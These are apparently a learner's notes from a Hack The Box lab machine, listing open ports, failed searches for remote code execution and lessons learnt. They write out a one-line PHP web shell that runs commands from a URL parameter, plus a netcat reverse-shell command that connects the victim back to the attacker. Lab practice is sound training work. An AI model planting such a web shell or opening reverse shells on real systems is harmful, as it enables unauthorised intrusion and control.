ip:10.10.10.29
ports:22,80,53

Apache 2.4.7 ---could not find  rce
SSH --- could not find  rce
DNS -- couldnt find rce


Things learnt:

always add the ip of machine in htb to /etc/hosts --- make this a habit
dont use the php shell from msfvenom bcoz we cant get interactive shell
from it

instead use

<?php echo (system($_GET['execute'])); ?>
This executes command which we can pass through the execute command
command: nc -e /bin/bash ip of our machine port

This makes the victim to connect back to us so setup a listener
